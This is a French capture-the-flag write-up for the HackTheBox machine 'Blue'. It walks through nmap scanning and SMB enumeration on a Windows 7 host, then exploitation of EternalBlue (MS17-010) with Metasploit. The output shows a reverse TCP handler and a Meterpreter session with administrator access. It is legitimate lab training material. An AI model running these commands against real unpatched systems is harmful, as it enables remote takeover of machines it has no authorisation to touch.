---
tags:
  - htb
  - smb
  - metasploit
  - cve
title: Blue
os: Windows
difficulty: Easy
date: 2025-11-15
status: terminé
draft: "false"
---
---
# Blue

> [!summary] Résumé rapide  
> Blue est une machine Facile de HackTheBox. L'exploitation nécessitait d'identifier un service vulnérable qui tournait sur une machine Windows 7 (exploit EternalBlue dans Windows SMB). Il était ensuite possible d'utiliser Metasploit pour exploiter la faille et obtenir un accès privilégié à la machine.

---

## 🟦 Informations générales

- **Nom de la machine :** Blue
- **OS :** Windows
- **Difficulty :** Easy
- **Auteur :** ch4p
- **Date :** 15/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.33.199 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 18:32 CET
Nmap scan report for 10.129.33.199
Host is up (0.024s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds
```

> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p135,139,445,49152,49153,49154,49155,49156,49157 10.129.33.199 -oN blue.nmap
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 18:35 CET
Nmap scan report for 10.129.33.199     
Host is up (0.020s latency).                             
                                                                                                                              
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                   
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-15T17:36:19
|_  start_date: 2025-11-15T17:31:28
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-15T17:36:18+00:00
|_clock-skew: mean: 5s, deviation: 1s, median: 5s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.65 seconds
```

---

### 📁 SMB
**Infos :** Login anonymous autorisé 
**Enumerations :**

Connexion listing des shares :

```bash
smbclient -L //blue.htb 
```

```bash
Password for [WORKGROUP\shep]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to blue.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Les shares `/Share` et `/Users` sont accessibles. Cependant en se connectant dessus, on ne trouve aucune information intéressante.

Scan des vulnérabilités avec `nmap` :

```bash
nmap -p135,139,445 -script vuln blue.htb
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 18:40 CET
Nmap scan report for blue.htb (10.129.33.199)
Host is up (0.020s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
```

Le service SMB semble avoir une vulnérabilité qui permet une exécution du code : [CVE-2017-0143](https://www.cve.org/CVERecord?id=CVE-2017-0143)

> [!info] Outils utilisés  
- smbclient 
- nmap

**Fichiers / données récupérées :** Présence d'une vulnérabilité sur le server.

---

## 🟦 3. Points d’entrée potentiels

-  Exploitation de la faille EternalBlue sur Windows SMB (CVE-2017-0143)

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

On va utiliser `msfconsole` (Metasploit) afin d'exploiter la cible.

```bash
msf > seach ms17-010
msf > use exploit/windows/smb/ms17_010_eternalblue
```

Configuration de l'exploit : (`options` pour voir les options)

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0                     LHOST => 10.10.14.66

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST blue.htb                 RHOST => blue.htb

msf exploit(windows/smb/ms17_010_eternalblue) > set target 1                       target => 1
```

`target 1` correspond à un serveur Windows 7 car nous savons que nous sommes sur Windows 7 grâce à nos scans nmap. 

**Résultat :**  

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.66:4444
[*] 10.129.33.199:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.33.199:445     - Host is likely VULNERABLE to MS17-010!
---
<snip>
---
[*] Meterpreter session 1 opened (10.10.14.66:4444 -> 10.129.33.199:49158) at 2025-11-15 18:58:07 +0100
```

![[Pasted image 20251115190036.png]]

**Accès obtenu :**  
- User :  administrator
- Contexte :  meterpreter/shell

---
## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Recherche de vulnérabilité avec nmap
-  Recherche de CVE en ligne

> [!attention] Patterns utiles  
-  Scan `-script vuln` sur nmap pour relever les vulnérabilités connues
